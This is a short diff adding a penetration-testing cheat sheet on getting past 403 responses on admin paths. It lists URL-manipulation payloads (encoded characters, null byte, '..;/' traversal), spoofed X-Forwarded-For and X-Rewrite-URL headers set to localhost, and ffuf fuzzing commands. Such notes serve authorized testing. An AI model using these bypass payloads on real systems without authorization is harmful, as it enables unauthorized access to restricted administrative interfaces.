@@ -1,0 +1,15 @@
+4XX is a best practice to express client error and 5XX to express server error. 
+
+/admin%20
+/admin%09
+/admin%00
+/admin/..;/
+/dummy../admin.jsp
+
+X-Rewrite-URL: /admin
+X-Real-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+
+1. "ffuf -u target --mc all" -> match all response codes
+2. ctrl+c after 5 sec
+3. "ffuf -u ... --mc all -fw ..."
